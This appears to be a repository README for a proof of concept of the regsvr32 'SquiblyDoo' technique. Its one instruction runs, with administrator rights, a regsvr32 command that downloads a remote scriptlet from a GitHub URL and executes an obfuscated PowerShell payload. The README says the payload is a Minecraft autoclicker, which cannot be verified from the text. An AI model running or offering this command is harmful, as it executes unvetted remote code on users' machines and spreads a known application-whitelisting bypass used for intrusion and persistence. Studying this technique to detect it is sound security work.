<h1 align="center">PERSISTANCE-AES</h1>

---

### **Overview**
This is a **proof of concept** for the **regsvr32 execution payload** known as **SquiblyDoo**.  

- Executes an **obfuscated payload**  
- Payload is a **C# Autoclicker** designed for **Minecraft**

---

### **How It Works**
1. **regsvr32** and **scrobj.dll** both allow scriptlet functions to be ran  
2. The scriptlet runs a powershell script which runs the obfuscated payload  

---

### **How to Use**

1. Run **Command Prompt** as an **Administrator**.
2. Execute the following command:

   ```bash
   regsvr32 /s /n /u /i:https://raw.githubusercontent.com/elosdfir/persistance-aes/refs/heads/main/aes.sct scrobj.dll

---

<p align="center">✨ Credits to Casey Smith ✨</p>
